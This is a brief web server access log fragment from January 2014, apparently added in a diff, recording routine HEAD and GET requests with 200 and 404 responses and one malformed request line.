+[10/Jan/2014 10:50:01] "HEAD / HTTP/1.0" 200 0
+[10/Jan/2014 11:16:14] "HEAD / HTTP/1.0" 200 0
+[10/Jan/2014 22:03:35] "HEAD / HTTP/1.0" 200 0
+[10/Jan/2014 22:29:44] "GET / HTTP/1.1" 200 8173
+[10/Jan/2014 22:29:44] "GET / HTTP/1.1" 200 8173
+[11/Jan/2014 04:12:41] "HEAD / HTTP/1.0" 200 0
+[11/Jan/2014 12:56:36] "GET /static/img/pic/1.jpg HTTP/1.1" 404 1646
+[11/Jan/2014 12:56:40] "GET /static/img/pic/1.jpg HTTP/1.1" 404 1646
+[11/Jan/2014 12:59:09] "HEAD / HTTP/1.0" 200 0
+[11/Jan/2014 13:08:31] "HEAD / HTTP/1.0" 200 0
+[11/Jan/2014 17:52:00] "HEAD / HTTP/1.0" 200 0
+[11/Jan/2014 20:40:36] "GET HTTP/1.1 HTTP/1.1" 404 1612
